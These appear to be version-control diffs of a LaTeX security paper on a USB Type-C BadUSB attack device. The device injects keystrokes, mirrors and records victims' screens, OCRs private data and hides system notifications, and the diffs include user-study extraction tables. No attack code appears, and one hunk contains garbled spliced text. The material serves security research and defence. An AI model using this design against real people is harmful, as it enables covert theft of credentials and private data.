+    multi-mode attack model, \tool.  It obtains UI status to make attacks more
+    precise and effective, and also bypasses existing defense methods for
+    BadUSB.  To the best of our knowledge, \tool is the first attack model
+    utilizing USB Type-C.  To validate the usability and effectiveness, we
+    conducted extensive experiments and a user study on a real-life attack
+    scenario.  10 volunteers are involved in, and 4,796 of 94,058 records
+    obtained by \tool in the user study are related to sensitive information.
+%\fengwei{What results?} \fengwei{what countermeasures do we propose? including
+    %isolated UI rendering.}
+We also discussed our recommended countermeasures for our attack model,
+    including isolated UI rendering, which may be inspiring for future research
+    on defense methods.
+
 \end{abstract}
@@
 
+\balance
+
 \bibliographystyle{IEEEtran}
 \bibliography{BadUSBC}
-\balance
 

### 2021-01-30 WOOT/Files/introduction.tex

@@
 modes of USB attacks based on our approach to verify its effectiveness,
-including scripting, remote control, and privacy extraction.  To improve the
+including HID Emulator Mode, Video Capture Mode, and Full Control Mode.  To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to
@@
 users are usually unconscious of the necessity to check the USB devices they
-plugged in for security purposes.  After the validation of our attack model, we
+plugged in for security purposes.  
+10 volunteers are involved in the user study.
+At last, we found that 4,796 of 94,058 records obtained by \tool are related to privacy information of users.
+After the validation of our attack model, we
 proposed several defense methods as countermeasures, including external

### 2021-01-30 WOOT/Files/experiment.tex
fix circles

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 The image of our \tool prototype can be found in Figure~\ref{fig:armory}.
-\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\footnotesize{1}} is the USB 3.x Hub; \circled[text=white,fill=myblue]{\footnotesize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\footnotesize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\footnotesize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\footnotesize{5}} is an Atmel ATMEGA32U4 board as the HID Emulator.
+\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the USB 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the HID Emulator.
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
@@
 		\hline
-		\textbf{Category}  & \textbf{Application} & \textbf{Leaked Sensitive Information}                      \\
+		\textbf{Application Column}  & \textbf{Application} & \textbf{Sensitive information leaked}                      \\
 		\hline
-		Finance App         & Alipay      & Alipay account, personal assets (blance)          \\
+		Finance App         & Alipay      & Alipay account, personal assets(blance)          \\
 		\hline
-		Social  Finance App & WeChat      & WeChat account, , chat history             \\
+		Social  Finance App & WeChat      & WeChat account, blance, chat history             \\
 		\hline
@@
 		\hline
-		Finance App         & ICBC        & ICBC account, password, personal assets (balance)  \\
+		Finance App         & ICBC        & ICBC account, password, personal assets(blance)  \\
 		\hline
-		Finance App         & Paypal      & Paypal account, balance, bank accounts            \\
+		Finance App         & Paypal      & Paypal account, blance, bank accounts            \\
 		\hline

### 2021-01-30 WOOT/BadUSBC.tex
nits

@@
     %isolated UI rendering.}
-We also discussed our recommended countermeasures for our attack model,
+We also discussed the recommended countermeasures for our attack model,
     including isolated UI rendering, which may be inspiring for future research
     on defense methods.
-
-\end{abstract}
 

### 2021-01-30 WOOT/Files/experiment.tex

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 The image of our \tool prototype can be found in Figure~\ref{fig:armory}.
-\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\footnotesize{1}} is the USB 3.x Hub; \circled[text=white,fill=myblue]{\footnotesize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\footnotesize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\footnotesize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\footnotesize{5}} is an Atmel ATMEGA32U4 board as the HID Emulator.
+
+\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the USB 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the HID Emulator.
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,

### 2021-01-30 WOOT/Files/experiment.tex
experiment figure

@@
 	\centering
-	\begin{tabular}{|c|c|c|c|c|}
+	\begin{tabular}{|c|c|c|c|c|c|c|} 
 		\hline
-		\textbf{Category}  & \textbf{Application} & \textbf{Leaked Sensitive Information}                      \\
+		\textbf{Keyword}                               & Account & Password & Phone number & Email & Username & Regexp for email~  \\ 
 		\hline
-		Finance App         & Alipay      & Alipay account, personal assets (blance)          \\
-		\hline
-		Social  Finance App & WeChat      & WeChat account, , chat history             \\
-		\hline
-		Social App          & QQ          & QQ account, interpersonal nexus, chat history    \\
-		\hline
-		Social App          & Twitter     & Twitter account, interpersonal nexus             \\
-		\hline
-		Social App          & Gmail       & Gmail account, mail records                      \\
-		\hline
-		Finance App         & ICBC        & ICBC account, password, personal assets (balance)  \\
-		\hline
-		Finance App         & Paypal      & Paypal account, balance, bank accounts            \\
-		\hline
-		Tool                & Chrome      & Sites visited                                    \\
-		\hline
-		Tool                & Health      & personal physical metrics      					 \\
+		\textbf{Number of records containing keywords} & 680     & 1596     & 1510         & 164   & 522      & 78                 \\
 		\hline
@@
 	\linebreak
-	\caption{Information Extraction via Manual Analysis.}\shuqing{Compress.}
+	\caption{Information Extraction via Manual Analysis.}
 	\label{table:information_extracted}

### 2021-01-30 WOOT/Files/badusb.tex

@@
 Figure~\ref{fig:attack_model} shows the architecture of our attack model.
-\mycircled{1} represents the victim's devices; \mycircled{2} is our \tool; \mycircled{3} is the attacker's remote PC.
+\circled[text=white,fill=myyellow]{\footnotesize{1}} represents the victim's devices; \circled[text=white,fill=myyellow]{\footnotesize{2}} is our \tool; \circled[text=white,fill=myyellow]{\footnotesize{3}} is the attacker's remote PC.
 The details of each component in \tool are as follows.

### 2021-01-30 WOOT/Files/experiment.tex
Update exp

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 The image of our \tool prototype can be found in Figure~\ref{fig:armory}.
-
-\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the USB 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the HID Emulator.
+\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\footnotesize{1}} is the USB 3.x Hub; \circled[text=white,fill=myblue]{\footnotesize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\footnotesize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\footnotesize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\footnotesize{5}} is an Atmel ATMEGA32U4 board as the HID Emulator.
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
@@
 %\shuqing{The data may need to be updated.}
-With these results, we could learn what content the victim visited.
+With these results, we could learn what content the victim visited, especially the privacy data.
 %\fengwei{The following text needs to be revised. It is quite difficult for me to understand. Note that this is important text because reviewers are curious about the result. }
-Additionally, keywords such as \textit{account, username, and password} often appear with users' input data because they are often used as labels of input boxes.
-Such keywords are more likely to lead us to user-specific data.
+We searched the result database with the keywords \textit{account, username, password, phone number and email}, as well as the regular expression of email.
+The records searched by such keywords and regular expression are usually related to privacy information of users.
 For example, when we searched with \textit{account} as a keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example}.
@@
 The frame number is the position of this frame in the recorded video, which indicates a target for manual analysis for further data extraction.
+At last, we found 4,172 of 94,058 records obtained by \tool which are related to privacy information, as shown in the Table.
 

### 2021-01-30 WOOT/BadUSBC.tex
fix compile error
add more keywords
abstract
fix

@@
     obtain the status of user interface to conduct precise attacks, and they
-    can detected by multiple existing countermeasures.  In this work, we
+    can be detected by multiple existing countermeasures.  In this work, we
     extended BadUSB to support the new features of USB Type-C and proposed a
@@
     conducted extensive experiments and a user study on a real-life attack
-    scenario.  10 volunteers are involved in, and 4,796 of 94,058 records
+    scenario.  10 volunteers are involved in, and 4,172 of 94,058 records
     obtained by \tool in the user study are related to sensitive information.
@@
     on defense methods.
+\end{abstract}
 
 \begin{IEEEkeywords}
-USB;BadUSB;
+USB; BadUSB; Type-C; Attack
 \end{IEEEkeywords}

### 2021-01-30 WOOT/Files/experiment.tex
exp
fix table IV

@@
 The frame number is the position of this frame in the recorded video, which indicates a target for manual analysis for further data extraction.
-At last, we found 4,172 of 94,058 records obtained by \tool which are related to privacy information, as shown in the Table.
+At last, we found 4,172 of 94,058 records obtained by \tool which are related to privacy information, as shown in the Table~\ref{table:information_extracted}.
 
@@
 In the manual analysis, we replayed the videos and extracted sensitive information.
-The data we collected are listed in Table~\ref{table:information_extracted}.
 Accounts of internet applications such as Apple, iCloud, Facebook, Twitter can be obtained.

### 2021-01-30 WOOT/Files/experiment.tex
table 4

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 %\shuqing{The data may need to be updated.}
-With these results, we could learn what content the victim visited, especially the privacy data.
+With these results, we could learn what content the victim visited.
 %\fengwei{The following text needs to be revised. It is quite difficult for me to understand. Note that this is important text because reviewers are curious about the result. }
-We searched the result database with the keywords \textit{account, username, password, phone number and email}, as well as the regular expression of email.
-The records searched by such keywords and regular expression are usually related to privacy information of users.
+Additionally, keywords such as \textit{account, username, and password} often appear with users' input data because they are often used as labels of input boxes.
+Such keywords are more likely to lead us to user-specific data.
 For example, when we searched with \textit{account} as a keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example}.
@@
 The frame number is the position of this frame in the recorded video, which indicates a target for manual analysis for further data extraction.
-At last, we found 4,172 of 94,058 records obtained by \tool which are related to privacy information, as shown in the Table.
 
@@
 		\hline
+		\textbf{Total Number of Records} & \multicolumn{6}{c}{4172} \\
+		\hline
 	\end{tabular}
 	\linebreak
-	\caption{Information Extraction via Manual Analysis.}
+	\caption{Privacy Extraction Result}
 	\label{table:information_extracted}

### 2021-01-30 WOOT/Files/experiment.tex
table

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 
+\begin{table*}[t]
+	\centering
+	\begin{tabular}{|l|l|l|l|}
+		\hline
+		\textbf{Keyword} & \textbf{Text}                                                             & \textbf{Name}                                   & \textbf{Frame Number} \\ \hline
+		username                          & X 8B cas.******.edu.cn Username: 11****18 Password:                                        & \textless{}user1\textgreater{} & 385                                    \\ \hline
+		username                          & Login Weibo Login with SMS and verification code ......
++86 151****4587                    & \textless{}user5\textgreater{} & 1947                                   \\ \hline
+		username                          & QQ 14*****50| Login with phone number New user registration 2345678 9 0                    & \textless{}user3\textgreater{} & 4308                                   \\ \hline
+		username                          & connect to *** username h*****l Save account information Open VPN.....
+& \textless{}user6\textgreater{} & 7925                                   \\ \hline
+		phone number                      & Login with phone number ......
++86 186****2483 |                                           & \textless{}user1\textgreater{} & 313                                    \\ \hline
+		phone number                      & Log in with your mobile phone number. ...... mobile phone number 131****9310 & \textless{}user9\textgreater{} & 210                                    \\ \hline
+		@                                 & contact email 30*******7G@qq.com, contact phone 027-88******                               & \textless{}user7\textgreater{} & 5324                                   \\ \hline
+		@                                 & Account 73*****5@qq.com @qq.com @163.com @gmail.com 	......      & \textless{}user6\textgreater{} & 621                                    \\ \hline
+	\end{tabular}
+	\linebreak
+	\caption{Examples of Searching OCR Results with Keywords.}
+	\label{tab:ocr_keyword_example}
+\end{table*}
+
+\begin{table*}[t]
+	\centering
+	\begin{tabular}{|c|c|c|c|c|c|c|}
+		\hline
+		\textbf{Keyword}                               & Account & Password & Phone number & Email & Username & Regexp for email~  \\
+		\hline
+		\textbf{Number of records containing keywords} & 680     & 1596     & 1510         & 164   & 522      & 78                 \\
+		\hline
+		\textbf{Total Number of Records} & \multicolumn{6}{c}{4172} \\
+		\hline
+	\end{tabular}
+	\linebreak
+	\caption{Privacy Extraction Result}
+	\label{table:information_extracted}
+\end{table*}
+
 We first introduce the technical background of our case study, sharing power
@@
 The records searched by such keywords and regular expression are usually related to privacy information of users.
-For example, when we searched with \textit{account} as a keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example}.
+For example, when we searched with \textit{account} as a keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example} and Table~\ref{table:information_extracted}.
 %\shuqing{Statistics.}
@@
 At last, we found 4,172 of 94,058 records obtained by \tool which are related to privacy information, as shown in the Table~\ref{table:information_extracted}.
-
-\begin{table*}[t]
-	\centering
-	\begin{tabular}{|l|l|l|l|}
-		\hline
-		\textbf{Keyword} & \textbf{Text}                                                             & \textbf{Name}                                   & \textbf{Frame Number} \\ \hline
-		username                          & X 8B cas.******.edu.cn Username: 11****18 Password:                                        & \textless{}user1\textgreater{} & 385                                    \\ \hline
-		username                          & Login Weibo Login with SMS and verification code ......
-+86 151****4587                    & \textless{}user5\textgreater{} & 1947                                   \\ \hline
-		username                          & QQ 14*****50| Login with phone number New user registration 2345678 9 0                    & \textless{}user3\textgreater{} & 4308                                   \\ \hline
-		username                          & connect to *** username h*****l Save account information Open VPN.....
-& \textless{}user6\textgreater{} & 7925                                   \\ \hline
-		phone number                      & Login with phone number ......
-+86 186****2483 |                                           & \textless{}user1\textgreater{} & 313                                    \\ \hline
-		phone number                      & Log in with your mobile phone number. ...... mobile phone number 131****9310 & \textless{}user9\textgreater{} & 210                                    \\ \hline
-		@                                 & contact email 30*******7G@qq.com, contact phone 027-88******                               & \textless{}user7\textgreater{} & 5324                                   \\ \hline
-		@                                 & Account 73*****5@qq.com @qq.com @163.com @gmail.com 	......      & \textless{}user6\textgreater{} & 621                                    \\ \hline
-	\end{tabular}
-	\linebreak
-	\caption{Examples of Searching OCR Results with Keywords.}
-	\label{tab:ocr_keyword_example}
-\end{table*}
 
@@
 It is worth mentioning that {secure keyboards} built in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
-
-\begin{table*}[t]
-	\centering
-	\begin{tabular}{|c|c|c|c|c|c|c|}
-		\hline
-		\textbf{Keyword}                               & Account & Password & Phone number & Email & Username & Regexp for email~  \\
-		\hline
-		\textbf{Number of records containing keywords} & 680     & 1596     & 1510         & 164   & 522      & 78                 \\
-		\hline
-	\end{tabular}
-	\linebreak
-	\caption{Information Extraction via Manual Analysis.}
-	\label{table:information_extracted}
-\end{table*}

### 2021-03-04 WOOT/Files/experiment.tex
minor
fuck
move table
steps of desensitization in user study

@@
 
-	\caption{\tool Prototype}
+	\caption{\tool Prototype.}
 	\label{fig:armory}
@@
 		\hline
-		\textbf{Number of records containing keywords} & 680     & 1596     & 1510         & 164   & 522      & 78                 \\
+		\textbf{Number of records containing keywords} & 680     & 1,596     & 1,510         & 164   & 522      & 78                 \\
 		\hline
-		\textbf{Total Number of Records} & \multicolumn{6}{c}{4172} \\
+		\textbf{Total Number of Records} & \multicolumn{6}{c|}{4,172} \\
 		\hline
@@
 	\linebreak
-	\caption{Privacy Extraction Result}
+	\caption{Privacy Extraction Result.}
 	\label{table:information_extracted}
@@
 	\includegraphics[width=\linewidth]{./Figs/qr_code_payment.png}
-	\caption{Bar/QR Code Payment Procedure}
+	\caption{Bar/QR Code Payment Procedure.}
 	\label{fig:qr_payment_procedure}
@@
 To obtain data close to real-life, they are requested to use phones like when they use the normal shared power banks.
-After the case study experiment, we introduced to them our attack, analyze the screen recordings together to make sure their personal data is not at risk.
+After every case study experiment, we introduced to him/her our attack, showed him/her the only raw files (video recorded and corresponding OCR results), told him/her to analyze the screen recordings and replace certain characters of the private data that appear in the OCR result with asterisks.
+It protects their privacy and is also a mark for us to confirm that the data we find contains their private data.
+After he/she made sure their private data is not at risk, he/she can destroy the only raw files, give the desensitized OCR result back to us.
 \shuqing{Do we need to mention that agreement the conference required here?}

### 2021-03-04 WOOT/Files/experiment.tex
detailed version

@@
 
-During the experiment of privacy extraction via our video capture mode, we chose \textit{HUAWEI P30}, a
-smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the
+During the experiment of privacy extraction via our video capture mode, we chose \textit{HUAWEI P30 (ELE-AL00)}, a
+smartphone in EMUI 11.0.0.135(C00E128R2P5) (Android 10.0 based) with a USB Type-C interface, as the
 target device.  In the privacy extraction experiment, \tool passively captured video

### 2021-03-04 WOOT/Files/discussion.tex
revise limitation

@@
 \subsection{Limitation}
-
+There exist multiple limitations of \tool.
+To begin with, when \tool is attached, the victim's device may not be set to mirror the screen.
+Depending on victim's settings, the \tool may be used as an extended monitor.
+For some smartphone vendors (e.g.
+Smartisan and Huawei), their devices are equipped with Desktop mode, which allows user to display an desktop on the external monitor.
+In these cases, the victim would easily notice the presence of \tool and become suspicious.
+Apart from that, we also noticed that in most devices, when an external monitor is connected to the device, there will be notifications about the monitor.
+In iPad, there is a small blue icon on the notification bar.
+In Huawei P30, there is a pop-up for user to select the functionality of the external monitor.
+In latter case of a pop-up, \tool can dismiss it by injecting keystrokes and mouse movements.
+But they are notifications after all and victims may notice \tool is a malicious device.
+Also, it cannot be ignored that DisplayPort over USB / DisplayPort Alternate Mode is not available on all devices.
+When selecting our experiment devices, we find that many smartphones equipped with USB-C connector does not support USB 3.2 protocol.
+This lack of support further limited \tool.
+But we believe that USB 3.2 will be more popular and better supported, so it is important for us to take defense against attacks like \tool in advance.
+\begin{comment}
 There exist multiple limitations of \tool.  To begin with, \tool can only gain
@@
 prompting messages.
-
+\end{comment}
 \subsection{Impact}

### 2021-03-04 WOOT/Files/badusb.tex
nits
impl free of GoodUSB

@@
 protocol and USB Type-C connector. As the USB 3.x standard is
-common nowadays, this assumption can be easily fulfilled especially in recent
+common nowadays, this assumption can be fulfilled in recent
 devices.
@@
 Based on the drawbacks introduced above, several defense mechanisms were
-proposed. GoodUSB~\cite{tian2015defending}
-implemented a CAPTCHA-like~\cite{captcha} procedure, which requires user to
-complete certain challenges when an unknown HID device is plugged in. As the
-BadUSB is only able to emulate a limited kind of devices such as HIDs or disks, by
-no means the BadUSB can bypass it.
+proposed. For example, GoodUSB~\cite{tian2015defending}
+implemented a authorization procedure when a new device is plugged in and blocks other functions excepted authorized ones.
 
@@
 attacks.
-Thus, our \tool is capable of
-bypassing defenses such as GoodUSB. Taking advantage of USB 3.x~\cite{usb31,usb32},
-\tool can fetch the video stream of the victim and complete the challenge
-manually by the attacker. Moreover, with video capability combined with
-traditional BadUSB, our \tool achieved multiple new attack paradigms and are
-tested under various real-world scenarios.
+However, we still unable to bypass defenses like GoodUSB~\cite{tian2015defending}, which completely blocks unauthorized functionality.
+This will be further discussed in Section~\ref{sec:discussion}
 
@@
 
-	\caption{Attack Model}%\shuqing{Need to be more compact.}
+	\caption{Attack Model.}%\shuqing{Need to be more compact.}
 	\label{fig:attack_model}
@@
 
-First, \tool supports defense-bypassing. As the original BadUSB cannot get
-feedback from the victim, defense mechanisms like GoodUSB~\cite{tian2015defending} are sufficient to prevent these BadUSB attacks.
-However, these defense mechanisms leverage visual notification to block access
-for unknown USB devices. This means that when the defense requests authorization
-from the user, our \tool is able to capture the content of authorization
-challenge and bypass it. After the defense is bypassed, \tool continues the
-emulation and script execution, resulting in a successful attack.
+First, as \tool has established a feedback channel using USB 3.2 protocol, when performing keystroke and mouse movement injection, attacker can obtain real-time feedback from the victim's devices.
+This feedback allows an attacker to tell whether the previous attack succeeded and decide what to perform next.
+Existence of such feedback channel largely strengthen the attack ability of \tool.
 
@@
 %bypass) and the end (result feedback) of the attack.
-Moreover, with mouse
+Also, with mouse
 supported, \tool extends the original BadUSB attack and results in further attacks in

### 2021-03-04 WOOT/Files/introduction.tex
impl free of GoodUSB

@@
 performing precise attacks.  We did experiments to verify that \tool could also
-bypass many countermeasures for BadUSB since they often rely on interaction
+bypass some countermeasures for BadUSB since they often rely on interaction
 with the graphical interface.  Moreover, we implemented multiple attacking
@@
 
-    \item Our approach can bypass many previous countermeasures of BadUSB.
+    %\item Our approach can bypass some previous countermeasures of BadUSB.
 

### 2021-03-04 WOOT/Files/experiment.tex
delete GoodUSB from experiment

@@
 2020}, a PC in Windows 10/Ubuntu OS with two USB Type-C interfaces as the
-target device.  During this experiment, \tool disguised itself as a normal
-keyboard and a home-brewed version of GoodUSB~\cite{tian2015defending} is
-deployed to test the defense-bypassing. We have tried to deploy the original
-GoodUSB on the target device; as the GoodUSB is proposed in 2015, the code is
-outdated and cannot be executed at target device; so we have to home-brew a similar
-defense mechanism based on its paper~\cite{tian2015defending}.  In the
-beginning, our home-brewed version of GoodUSB asked the victim to manually complete
-a CAPTCHA to authorize the new USB device, a.k.a our \tool.
-%But at this time,
-%by the design of GoodUSB,
-%\fengwei{The following sentence is hard to
-%understand.}\hongyi{Fixed, removed redundant description}
-However, our attack can enter keystrokes to complete the
-CAPTCHA with the video stream by \tool. Up
-to this point, the bypass of defense like GoodUSB is completed and our \tool
-becomes a trusted device. Next, our
-\tool works similar to the original BadUSB, inserting keystrokes to perform
-arbitrary execution on the laptop. We tested three scripts, ranging from
+target device. \hongyi{TODO: FIXING} We tested three scripts, ranging from
 reverse shell backdoor to malware payload execution, all of which resulting in

### 2021-03-05 WOOT/Files/experiment.tex
add initilization process

@@
 
+\subsection{Attack Initialization}
+After the \tool is plugged into the victim's device, there is an initialization process to make sure the \tool is able to carry out subsequent attack.
+\begin{itemize}
+	\item \textbf{Screen Mirror}:
+		During our experiment, we noticed that some devices do not mirror their screen to our \tool by default.
+In this case, \tool will inject a sequence of keystrokes and mouse movements to set the victim's device into mirror their screen.
+For example, in Windows 10, \tool can inject `Win+P' keystroke and a mouse click on the `Duplicate' option.
+However, as \tool is unable to obtain the screen during this process, this can only be performed blindly with a possibility of failure.
+	\item \textbf{Dismiss Notification}:
+		In our experiment, we found that some devices will notify the user presence of an external screen.
+To avoid being discovered by the victim, \tool will inject keystrokes and mouse movement to dismiss these notifications.
+Detailed notifications is listed in Table~\ref{tab:notification}.
+\end{itemize}
+
 \subsection{HID Emulator Mode}
@@
 In the experiment of HID emulator mode, we used {Lenovo Xiaoxin Pro 13
-2020}, a PC in Windows 10/Ubuntu OS with two USB Type-C interfaces as the
-target device. \hongyi{TODO: FIXING} We tested three scripts, ranging from
+2020}, a PC in Windows 10 with two USB Type-C interfaces as the
+target device.  We tested three scripts, ranging from
 reverse shell backdoor to malware payload execution, all of which resulting in

### 2021-03-05 WOOT/Files/experiment.tex
HID emulating changed

@@
 2020}, a PC in Windows 10 with two USB Type-C interfaces as the
-target device.  We tested three scripts, ranging from
-reverse shell backdoor to malware payload execution, all of which resulting in
-success. With this experiment, we have demonstrated the defense-bypassing is successful
-using \tool.
+target device.
+During this experiment, \tool disguised itself as a normal keyboard and an external screen as feedback channel.
+When first plugged in, the victim's devices raise a pop-up window asking victim's what mode should new screen be set to.
+\tool immediately inject a sequence of mouse movement and click to set itself as a mirror to the primary monitor.
+Thus we have successfully completed the attack initialization.
+Then we tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of which resulting in success.
+Compared to original BadUSB attacks like Rubber Ducky, our \tool can provide attacker real-time feedback which allows attacker to perform more accurate attack.
 %This also warned us that we need more thorough defense against such BadUSB
@@
 QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
-As illustrated in Figure~\ref{fig:qr_payment_procedure}, QR code payment is typically performed in the following steps:
+As illustrated in Figure~\ref{fig:qr_payment_procedure}, QR code paymeinformation from the video stream.  When the victim viewed text or photos withnt is typically performed in the following steps:
 \ding{182} The client presents the payment QR code on the mobile device to the merchant.

### 2021-03-05 WOOT/BadUSBC.tex
Abs

@@
 
-The security of USB protocol has been paid extensive attention to, despite its
+The security of USB protocol has been paid extensive attention to because of its
     wide usage.  Due to the \textit{trust-by-default} characteristics, USB
@@
     mice.  However, BadUSB suffers from several limitations.  Attackers cannot
-    obtain the status of user interface to conduct precise attacks, and they
-    can be detected by multiple existing countermeasures.  In this work, we
+    obtain the status of user interface to conduct precise attacks as well as get the visual feedback of their attacks.  In this work, we
     extended BadUSB to support the new features of USB Type-C and proposed a
     multi-mode attack model, \tool.  It obtains UI status to make attacks more 
-    precise and effective, and also bypasses existing defense methods for
-    BadUSB.  To the best of our knowledge, \tool is the first attack model
+    precise and effective.  To the best of our knowledge, \tool is the first attack model
     utilizing USB Type-C.  To validate the usability and effectiveness, we

### 2021-03-05 WOOT/Files/related_work.tex
minor
Compare ours with JFC

@@
 
+It is worth noting that our \tool is different from JFC~\cite{JFC}.
+Firstly, Juice Filming Attacks can not control the attacked device, but can only video-capture user inputs during charging.
+However, our \tool can monitor the screen at the same time as controling the attacked device, which enhances the efficiency of stealing users’ private data.
+Second, we design an prototype to attack in real time remotely.
+Third, the scope of \tool is wider, \tool also poses a threat to laptops that charged with use USB-C interface.
+
 \subsection{USB Security Defenses}
@@
 From the hardware perspective, the BadUSB attack requires `D-' and `D+' pins which
-are defined by the protocol to transmitting data. Without these pins, data cannot 
+are defined by the protocol to transmit data. Without these pins, data cannot 
 be transferred via a USB cable. Based

### 2021-03-06 WOOT/Files/related_work.tex
related work

@@
 by the device to the user and let the user decides whether to authorize. When a device
-is plugged in, GoodUSB loads its driver but limits its functionality until a
+is plugged in, GoodUSB limits its functionality before enumeration until a
 series of authorizations are completed. These authorizations are designed to be
-performed manually. As BadUSB is normally unable to obtain the video stream of
-the host, an attacker cannot complete this authorization with
-an automatic script. Thus this defense is sufficient for a normal BadUSB attack. But
-if the attacker has the access to victim's screen, GoodUSB would be bypassed
-easily as the attacker can complete this authorization manually and
-perform subsequent attacks.
+performed manually, thus the malicious devices will be detected for making a different claim 
+that does not match the authorization results. USBeSafe\cite{usbesafe} analyses the 
+feature vector constructed from with data collected from USB Request Block(URBs), 
+it would detect the novel USB packets based on the machine learning algorithm and send 
+a alert to the user before enumeration. As BadUSB attacks normally request privileged 
+interfaces during enumerating, these defenses are sufficient for these attacks.
 
@@
 archives almost absolute security, the functionality of USB is sacrificed.
-Other solutions like GoodUSB or whitelist are either bypassable or insufficient
+Other solutions like whitelist are either bypassable or insufficient
 under certain scenarios. Vendors may sacrifice complete security to
@@
 		\hline
-		\makecell{GoodUSB~\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circleempty\\
+		\makecell{GoodUSB~\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circlefull\\
 		\hline

### 2021-03-06 WOOT/Files/experiment.tex
add notification table

@@
 
+\begin{table*}[]
+	\begin{tabular}{|c|c|c|c|}
+		\hline
+		Device                                                               & Operating System                                                                                         & Notification              & Dismiss Action                                            \\ \hline
+		\begin{tabular}[c]{@{}c@{}}Lenovo Xiaoxin Pro 13\\ 2020\end{tabular} & Windows 10 (OS Build 18363.1379)                                                                         & Pop-up                    & ``Win+P''-\textgreater{}Mouse click on `Duplicate' Option \\ \hline
+		\multirow{2}{*}{HUAWEI P30 (ELE-AL00)}                               & \multirow{2}{*}{\begin{tabular}[c]{@{}c@{}}EMUI 11.0.0.135(C00E128R2P5)\\ Android 10 based\end{tabular}} & Status bar indicator      & N/A                                                       \\ \cline{3-4}
+		&                                                                                                          & Persistent notifications  & N/A                                                       \\ \hline
+		\multirow{2}{*}{iPad Pro (3rd generation)}                           & \multirow{2}{*}{iOS 14.4 (Build 18D52)}                                                                  & Status bar indicator      & N/A                                                       \\ \cline{3-4}
+		&                                                                                                          & Pop-up (only when locked) & N/A                                                       \\ \hline
+	\end{tabular}
+	\linebreak
+	\caption{Notifications about \tool}
+	\label{tab:notification}
+\end{table*}
+
 \subsection{HID Emulator Mode}
@@
 In the experiment of HID emulator mode, we used {Lenovo Xiaoxin Pro 13
-2020}, a PC in Windows 10 with two USB Type-C interfaces as the
+2020}, a PC in Windows 10 (OS Build 18363.1379) with two USB Type-C interfaces as the
 target device.
@@
 To test the capability of the full control mode, we chose iPad Pro (3rd
-	generation), a tablet in iOS 14.3 with a USB Type-C interface, as the target
+	generation), a tablet in iOS 14.4 (Build 18D52) with a USB Type-C interface, as the target
 device in this experiment.  Besides disguising as normal HID devices like a

### 2021-03-06 WOOT/Files/related_work.tex
fix related work

@@
 High-Definition Link) which extends the USB standard and allows the video signal to
-be transmitted through the USB interface. JFC~\cite{JFC}, short for juicy filming
-charging is such a work that abuses this standard and exfiltrate video data
